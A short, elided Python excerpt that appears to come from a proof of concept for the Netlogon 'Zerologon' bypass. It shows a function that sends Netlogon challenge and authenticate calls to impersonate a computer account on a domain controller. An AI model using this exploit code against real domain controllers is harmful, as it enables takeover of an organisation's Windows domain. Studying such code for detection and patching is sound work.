...
def try_zero_authenticate(dc_handle, dc_ip, target_computer):
    ...
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle.encode() + b'\x00', target_computer.encode() + b'\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle.encode() + b'\x00', target_computer.encode() + b'$\x00', 
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer.encode() + b'\x00', ciphertext, flags
        )
